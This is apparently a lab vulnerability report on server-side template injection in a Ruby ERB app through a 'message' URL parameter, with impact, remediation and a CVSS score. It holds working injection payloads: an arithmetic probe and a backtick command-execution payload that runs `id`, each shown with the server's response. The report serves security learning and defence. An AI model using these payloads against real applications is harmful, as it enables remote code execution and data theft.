# Basic server-side template injection

## Description
The application is vulnerable to Server-Side Template Injection (SSTI). User-controlled input from the `message` parameter is rendered directly by a Ruby ERB template engine without proper sanitization, allowing execution of arbitrary template expressions and server-side code.

## Steps to Exploit
1. Navigate to the home page and identify the `message` URL parameter.
2. Modify the parameter value to:
   ```ruby
   <%=7*7%>
   ```
3. Send the request and observe the response.
4. Verify that the application returns `49`, confirming server-side template evaluation.
5. Further testing demonstrates code execution by injecting:
   ```ruby
   <%=`id`%>
   ```

## Proof of Concept

### Detection Payload
```ruby
<%=7*7%>
```

### Response
```text
49
```

### RCE Escalation Payload
```ruby
<%=`id`%>
```

### Response
```text
uid=1000(peter) gid=1000(peter)
```

## Impact
- Remote Code Execution (RCE) on the application server.
- Unauthorized access to sensitive files and system resources.
- Exposure of credentials, secrets, and configuration data.
- Potential for lateral movement and persistent compromise.

## Remediation
1. Never render user-supplied input as template code.
2. Pass user input as data through template context variables.
3. Use sandboxed template engines where possible.
4. Implement strict input validation and output encoding.
5. Restrict application permissions using the principle of least privilege.

## CVSS Score
**CVSS v3.1: 9.8 (Critical)**

**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

## CVSS Justification
- **Attack Vector:** Network – exploitable through URL parameter manipulation.
- **Attack Complexity:** Low – requires only a crafted template expression.
- **Privileges Required:** None.
- **User Interaction:** None.
- **Confidentiality:** High – attacker can access sensitive data and files.
- **Integrity:** High – arbitrary code execution allows modification of system resources.
- **Availability:** High – attacker can disrupt services or execute destructive commands.